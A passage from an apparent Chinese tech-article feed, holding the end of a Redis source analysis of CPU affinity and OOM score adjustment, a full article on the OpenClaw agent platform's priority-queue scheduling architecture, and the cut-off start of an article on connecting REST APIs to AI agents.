<p>在实现上，Redis 提供了<code>setcpuaffinity</code>函数来封装 CPU 绑定操作，该函数会根据操作系统调用对应接口。例如，在 Linux 上，它会使用<code>sched_setaffinity</code>将线程绑定到指定核心。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">redisSetCpuAffinity</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cpulist)</span> {
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> USE_SETCPUAFFINITY</span>
    setcpuaffinity(cpulist);
<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
    UNUSED(cpulist);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}

<span class="hljs-comment">/* set current thread cpu affinity to cpu list, this function works like
 * taskset command (actually cpulist parsing logic reference to util-linux).
 * example of this function: "0,2,3", "0,2-3", "0-20:2". */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">setcpuaffinity</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cpulist)</span> {
...
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span>
    sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cpuset), &amp;cpuset);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __FreeBSD__</span>
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span>(cpuset), &amp;cpuset);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __DragonFly__</span>
    pthread_setaffinity_np(pthread_self(), <span class="hljs-keyword">sizeof</span>(cpuset), &amp;cpuset);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __NetBSD__</span>
    pthread_setaffinity_np(pthread_self(), cpuset_size(cpuset), cpuset);
    cpuset_destroy(cpuset);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}
</code></pre>
<p>对于 Redis 这种单线程应用（主线程只能在一个 CPU 核心上处理请求）来说，进行 CPU 绑定的好处显而易见：减少 CPU 上下文切换、提高 CPU Cache 命中率、避免受到其他高负载任务的干扰。唯一的不足是增加了运维的配置和管理成本。</p>
<h2 data-id="heading-5">oom-score-adj、oom-score-adj-values</h2>
<pre><code class="hljs language-vbscript" lang="vbscript">createEnumConfig(<span class="hljs-string">"oom-score-adj"</span>, <span class="hljs-literal">NULL</span>, MODIFIABLE_CONFIG, oom_score_adj_enum, <span class="hljs-built_in">server</span>.oom_score_adj, OOM_SCORE_ADJ_NO, <span class="hljs-literal">NULL</span>, updateOOMScoreAdj),
createSpecialConfig(<span class="hljs-string">"oom-score-adj-values"</span>, <span class="hljs-literal">NULL</span>, MODIFIABLE_CONFIG | MULTI_ARG_CONFIG, setConfigOOMScoreAdjValuesOption, getConfigOOMScoreAdjValuesOption, rewriteConfigOOMScoreAdjValuesOption, updateOOMScoreAdj),
</code></pre>
<p>其中，</p>
<ul>
<li>oom-score-adj：是否启用 OOM 调整。可选值有：</li>
<li>
<ul>
<li>no：禁用。默认值。</li>
<li>yes / relative：启用相对模式（在系统原始 OOM 值的基础上叠加）。</li>
<li>absolute：启用绝对模式（直接使用配置值，不考虑系统原始值）。</li>
</ul>
</li>
<li>oom-score-adj-values：针对不同角色设置 OOM 权重。该参数需要配置三个值，分别对应：主节点、从节点、后台子进程（BGCHILD，用于 RDB / AOF / 复制）。默认值为<code>0 200 800</code>。数值越大，表示在系统内存紧张时越容易被 OOM Killer 杀死。</li>
</ul>
<p>无论是修改 oom-score-adj 还是 oom-score-adj-values，都会调用<code>updateOOMScoreAdj</code> 。</p>
<p>该函数会根据进程角色（主节点、从节点或后台子进程）为当前进程设置对应的 oom_score_adj 值。</p>
<pre><code class="hljs language-ini" lang="ini">static int updateOOMScoreAdj(const char **err) {
    if (setOOMScoreAdj(-1) == C_ERR) {
        *<span class="hljs-attr">err</span> = <span class="hljs-string">"Failed to set current oom_score_adj. Check server logs."</span><span class="hljs-comment">;</span>
        return 0<span class="hljs-comment">;</span>
    }

    return 1<span class="hljs-comment">;</span>
}

// 根据进程类别设置 Redis 的 oom_score_adj，process_class: 进程类别，-1 表示自动选择
int setOOMScoreAdj(int process_class) {
    // 如果传入 -1，自动根据角色选择 master 或 replica
    if (<span class="hljs-attr">process_class</span> == -<span class="hljs-number">1</span>)
        <span class="hljs-attr">process_class</span> = (server.masterhost ? CONFIG_OOM_REPLICA : CONFIG_OOM_MASTER)<span class="hljs-comment">;</span>

    serverAssert(process_class &gt;= 0 &amp;&amp; process_class &lt; CONFIG_OOM_COUNT)<span class="hljs-comment">;</span>

<span class="hljs-comment">#ifdef HAVE_PROC_OOM_SCORE_ADJ</span>
    // oom_score_adjusted_by_redis：标记 Redis 是否已修改过 OOM 分数。
    // oom_score_adj_base：保存原始 OOM 分数，以便回滚或禁用时恢复。
    static int <span class="hljs-attr">oom_score_adjusted_by_redis</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    static int <span class="hljs-attr">oom_score_adj_base</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>

    int fd<span class="hljs-comment">;</span>
    int val<span class="hljs-comment">;</span>
    char buf<span class="hljs-section">[64]</span><span class="hljs-comment">;</span>
    // oom_score_adj 不为 no
    if (server.oom_score_adj != OOM_SCORE_ADJ_NO) {
        // 第一次修改时，备份原始 oom_score_adj
        if (!oom_score_adjusted_by_redis) {
            <span class="hljs-attr">oom_score_adjusted_by_redis</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
            /* Backup base value before enabling Redis control over oom score */
            <span class="hljs-attr">fd</span> = open(<span class="hljs-string">"/proc/self/oom_score_adj"</span>, O_RDONLY)<span class="hljs-comment">;</span>
            if (fd &lt; 0 || read(fd, buf, sizeof(buf)) &lt; 0) {
                serverLog(LL_WARNING, "Unable to read oom_score_adj: %s", strerror(errno))<span class="hljs-comment">;</span>
                if (fd != -1) close(fd)<span class="hljs-comment">;</span>
                return C_ERR<span class="hljs-comment">;</span>
            }
            <span class="hljs-attr">oom_score_adj_base</span> = atoi(buf)<span class="hljs-comment">;</span>
            close(fd)<span class="hljs-comment">;</span>
        }
        // 获取配置的 OOM 分数
        <span class="hljs-attr">val</span> = server.oom_score_adj_values[process_class]<span class="hljs-comment">;</span>
        // 如果是相对模式，累加原始值
        if (<span class="hljs-attr">server.oom_score_adj</span> == OOM_SCORE_RELATIVE)
            val += oom_score_adj_base<span class="hljs-comment">;</span>
        // 限制值在 <span class="hljs-section">[-1000, 1000]</span>
        if (val &gt; 1000) <span class="hljs-attr">val</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
        if (val &lt; -1000) <span class="hljs-attr">val</span> = -<span class="hljs-number">1000</span><span class="hljs-comment">;</span>
    } else if (oom_score_adjusted_by_redis) {
        // 如果配置禁用 OOM 调整且之前已修改过，恢复原始值
        <span class="hljs-attr">oom_score_adjusted_by_redis</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        <span class="hljs-attr">val</span> = oom_score_adj_base<span class="hljs-comment">;</span>
    }
    else {
        return C_OK<span class="hljs-comment">;</span>
    }

    snprintf(buf, sizeof(buf) - 1, "%d\n", val)<span class="hljs-comment">;</span>
    // 写入 /proc/self/oom_score_adj，使内核生效
    <span class="hljs-attr">fd</span> = open(<span class="hljs-string">"/proc/self/oom_score_adj"</span>, O_WRONLY)<span class="hljs-comment">;</span>
    if (fd &lt; 0 || write(fd, buf, strlen(buf)) &lt; 0) {
        serverLog(LL_WARNING, "Unable to write oom_score_adj: %s", strerror(errno))<span class="hljs-comment">;</span>
        if (fd != -1) close(fd)<span class="hljs-comment">;</span>
        return C_ERR<span class="hljs-comment">;</span>
    }

    close(fd)<span class="hljs-comment">;</span>
    return C_OK<span class="hljs-comment">;</span>
<span class="hljs-comment">#else</span>
    /* Unsupported */
    return C_ERR<span class="hljs-comment">;</span>
<span class="hljs-comment">#endif</span>
}
</code></pre>
<p>具体实现上，系统的原始 OOM 值通过读取<code>/proc/self/oom_score_adj</code>获取。</p>
<p>在第一次启用 OOM 调整时，Redis 会将该原始值保存到 oom_score_adj_base 中，以便在后续禁用配置或发生配置回滚时，能够将进程的 OOM 值恢复为调整前的状态。</p>
<p>无论是相对模式还是绝对模式，最终生效的 OOM 值都会写回到<code>/proc/self/oom_score_adj</code>。</p>
<p>需要注意的是，oom-score-adj-values 允许配置的取值范围为 [-2000, 2000]，而 Linux 内核实际支持的 oom_score_adj 范围仅为[-1000, 1000]。</p>
<p>之所以放宽配置范围，是为了更好地支持相对模式（relative）：在相对模式下，配置值会与系统原始 OOM 值进行叠加，叠加后的结果再被裁剪到内核允许的范围内，从而在不同系统初始 OOM 设置下仍能保持合理、可控的调整效果。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw 调度架构深度剖析：高自主 AI 代理如何实现确定性任务编排与实时响应]]></title>    <link>https://juejin.cn/post/7602928783597060102</link>    <guid>https://juejin.cn/post/7602928783597060102</guid>    <pubDate>2026-02-05T06:50:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928783597060102" data-draft-id="7602996277663875126" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw 调度架构深度剖析：高自主 AI 代理如何实现确定性任务编排与实时响应"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-02-05T06:50:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RoyLin"/> <meta itemprop="url" content="https://juejin.cn/user/2928754708185917"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw 调度架构深度剖析：高自主 AI 代理如何实现确定性任务编排与实时响应
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754708185917/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RoyLin
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:50:20.000Z" title="Thu Feb 05 2026 06:50:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>OpenClaw（前身 Clawdbot / Moltbot）作为目前最活跃的自托管常驻式 agentic AI 平台之一，以其强大的长期自治能力、多源触发响应、复杂工具链并发执行而在社区迅速积累热度。其底层任务调度系统能够在处理海量异步事件、用户交互、定时任务、外部触发的同时，保持低延迟、高确定性和可控性，成为 agentic 系统工程实践的典型案例。</p>
<p>本文基于 OpenClaw 的公开设计文档、社区讨论与实际运行特征，系统拆解其调度架构的核心逻辑、优先级策略、并发隔离机制与可靠性保障手段，并结合自动驾驶领域常见的类似需求进行对比分析，帮助开发者理解这类高自主 AI 代理在生产环境下的真实工程挑战与解决方案。</p>
<h2 data-id="heading-0">OpenClaw 任务调度核心架构总览</h2>
<p>OpenClaw 的运行时本质上是一个永不停止的“事件-决策-行动”闭环引擎，主要由以下几个关键层组成：</p>
<ol>
<li>
<p><strong>事件源层</strong><br/>
持续监听多渠道输入：用户聊天消息、邮件/IM 通知、文件/目录变更监控、定时 Cron、Webhook、RSS 订阅等。每个事件被封装为统一的“触发器”（Trigger）对象，携带元信息（来源、紧急度、关联会话等）。</p>
</li>
<li>
<p><strong>任务生成与优先级标注层</strong><br/>
触发器经过 LLM 推理或规则引擎后，生成一个或多个可执行的“命令”（Command），每个命令被赋予优先级标签。优先级通常分为 4–6 个级别：</p>
<ul>
<li>最高：系统级安全/紧急干预（沙箱逃逸恢复、敏感操作确认、立即停止）</li>
<li>高：用户直接指令（尤其是包含“现在”“紧急”“立即”等显式急迫语义）</li>
<li>中：实时响应型任务（邮件回复、异常告警推送、浏览器关键步骤）</li>
<li>低：主动规划型任务（每日/每周摘要、长期目标拆解）</li>
<li>极低：后台维护（索引构建、日志聚合、模型缓存刷新）</li>
</ul>
</li>
<li>
<p><strong>多级执行队列与调度器</strong><br/>
OpenClaw 采用多队列 + 优先级调度器模型，而非单一 FIFO 队列。调度器按优先级顺序轮询各个队列，只有当前最高优先级队列为空或达到并发上限时，才会下探到下一级。这种设计确保了关键路径的确定性响应。</p>
</li>
<li>
<p><strong>执行引擎层</strong><br/>
基于 Tokio（或类似异步运行时）的工作者池执行命令，支持工具调用（浏览器自动化、shell 执行、API 请求等）。每个命令执行上下文独立，包含超时、重试、错误捕获与结果回传机制。</p>
</li>
<li>
<p><strong>状态与历史管理</strong><br/>
所有命令执行记录持久化到本地数据库（通常 SQLite 或 LevelDB），支持断点续跑、失败重放、人工干预等功能。</p>
</li>
</ol>
<h2 data-id="heading-1">优先级与并发隔离的关键实现细节</h2>
<p>OpenClaw 通过以下机制实现任务间的严格隔离与资源公平：</p>
<ul>
<li>
<p><strong>优先级抢占式调度</strong><br/>
调度循环始终优先处理最高优先级队列中的待执行命令。只有该队列为空或活跃任务数达到上限，才会处理次高优先级队列。这种严格优先级策略避免了低优先级长任务阻塞用户交互。</p>
</li>
<li>
<p><strong>分级并发限流</strong><br/>
不同优先级队列拥有独立的并发上限：</p>
<ul>
<li>系统/紧急队列：并发 1–2（独占式执行，避免竞争）</li>
<li>用户直接指令：并发 2–4（保证交互流畅）</li>
<li>工具调用队列：并发 4–10（视本地资源动态调整）</li>
<li>后台队列：并发 1–2（资源空闲时执行）</li>
</ul>
</li>
<li>
<p><strong>动态优先级提升（Priority Boosting）</strong><br/>
在运行时检测到高紧急语义（关键词匹配、用户连续追问、异常分数超阈值等）时，可将任务临时提升到更高优先级队列。这种机制在用户体验与系统稳定性之间取得了良好平衡。</p>
</li>
<li>
<p><strong>超时与重试分层</strong><br/>
高优先级命令通常设置较短超时（5–30s），失败后快速重试或进入人工审核；低优先级任务则允许更长超时与更多重试次数。</p>
</li>
</ul>
<h2 data-id="heading-2">可靠性与可观测性保障</h2>
<ul>
<li>
<p><strong>死信与失败捕获</strong><br/>
多次重试失败的命令被推入死信队列（Dead Letter Queue），保留完整上下文（输入、错误栈、执行环境快照），便于开发者离线诊断与补偿。</p>
</li>
<li>
<p><strong>优雅关机与排水</strong><br/>
支持 drain 模式：在收到停止信号后，先处理完所有已接受的高优先级任务，再逐步关闭低优先级队列，确保数据一致性。</p>
</li>
<li>
<p><strong>指标与告警</strong><br/>
实时暴露队列深度、命令延迟分布（p50/p90/p99）、重试率、失败率等核心指标。社区常见做法是集成 Prometheus + Grafana，或简单通过日志 + webhook 实现阈值告警。</p>
</li>
</ul>
<h2 data-id="heading-3">与自动驾驶调度需求的对比</h2>
<p>自动驾驶系统的任务调度需求与 OpenClaw 有高度相似性，但对确定性与延迟的要求更极端：</p>









































<table><thead><tr><th>维度</th><th>OpenClaw（agentic AI）</th><th>自动驾驶（L4/L5 级别）</th><th>共同解决方案趋势</th></tr></thead><tbody><tr><td>最高优先级任务</td><td>用户紧急指令、安全干预</td><td>AEB、接管请求、故障安全</td><td>严格优先级 + 并发 1–2</td></tr><tr><td>核心控制循环</td><td>工具调用主路径</td><td>感知→预测→规划→控制 100–200Hz 主循环</td><td>专用高优先级通道 + 低抖动调度</td></tr><tr><td>后台任务</td><td>日志、索引、模型更新</td><td>地图增量、诊断上传、OTA</td><td>极低优先级 + 资源空闲执行</td></tr><tr><td>动态优先级调整</td><td>语义急迫度、连续交互</td><td>行人/红灯紧急场景、接管信号</td><td>运行时 boosting 机制</td></tr><tr><td>容错与恢复</td><td>死信队列 + 人工干预</td><td>关键任务持久化 + 节点重启快速恢复</td><td>DLQ + 持久化存储</td></tr></tbody></table>
<p>两者都强烈依赖“多队列 + 严格优先级 + 并发隔离”的范式，以避免低优先级任务对关键路径的干扰。</p>
<h2 data-id="heading-4">总结</h2>
<p>OpenClaw 的调度架构通过多级优先级队列、动态并发限流、优先级提升与完备的可靠性机制，成功实现了高自主 AI 代理在复杂、多源、长时间运行场景下的确定性与可控性。其设计思路对任何需要处理混合优先级异步任务的系统（包括但不限于 agentic AI、实时决策平台、工业控制等）都具有极高的参考价值。</p>
<p>值得一提的是，社区中也有一些专注于类似场景的 Rust 开源项目，例如 A3S-Lab 实现的 Lane-based Command Queue，它采用纯 Rust 开发的多车道（Lane）优先级命令队列模型，提供严格优先级调度、精细并发控制与企业级可观测性，已在部分高确定性异步系统中得到验证与应用。感兴趣的开发者可进一步对比不同语言与实现范式下的工程取舍。</p>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FA3S-Lab%2FLane" target="_blank" title="https://github.com/A3S-Lab/Lane" ref="nofollow noopener noreferrer">github.com/A3S-Lab/Lan…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[传统Restful API快速集成AI Agent：3种方案+选型指南]]></title>    <link>https://juejin.cn/post/7603160727716692019</link>    <guid>https://juejin.cn/post/7603160727716692019</guid>    <pubDate>2026-02-05T06:50:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727716692019" data-draft-id="7602935146706616366" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="传统Restful API快速集成AI Agent：3种方案+选型指南"/> <meta itemprop="keywords" content="Spring Boot,RESTful,Java"/> <meta itemprop="datePublished" content="2026-02-05T06:50:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员越"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            传统Restful API快速集成AI Agent：3种方案+选型指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员越
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:50:33.000Z" title="Thu Feb 05 2026 06:50:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 